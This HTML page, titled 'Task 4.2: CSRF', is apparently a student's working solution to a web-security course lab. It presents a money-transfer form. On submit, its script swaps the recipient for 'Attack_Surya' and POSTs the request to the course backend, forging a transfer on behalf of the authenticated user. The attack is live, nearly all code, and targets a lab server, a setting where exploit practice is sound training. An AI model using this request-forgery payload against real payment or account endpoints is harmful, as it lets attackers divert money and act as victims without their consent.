<html>
<head>
    <title>Task 4.2: CSRF</title>
</head>
<body>
    <form method="post" id="Attack_Form">
        <div class="question-container">
            <p>Transfer Money (Authenticated Users)</p>
            <input type="hidden" name="username" value="skp6318"/>
            <label>Recipient Name : </label>
            <input type="text" placeholder="Enter first name" name="fname" class="small-input-box" required="">
            <div class="vertical-divider"></div>
            <label>Amount to be sent : </label>
            <input type="text" placeholder="Enter valid positive integer" name="amount" class="small-input-box" required="">
            <div class="vertical-divider"></div>
            <label>Comments : </label>
            <input type="text" placeholder="Enter your comments" name="comment" class="small-input-box" required="">
            <div class="vertical-divider"></div>
            <button type="submit" name="dataForm">Submit</button>
        </div>
    </form>
</body>
<script>
    document.getElementById('Attack_Form').addEventListener('submit', function(event) {
    event.preventDefault();

    const formData = new FormData(this);

    formData.set('fname', 'Attack_Surya');

    fetch('https://cse543.websecurity.ngrok.pizza/backend/tfourtwo', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => console.log(data))
});
</script>
</html>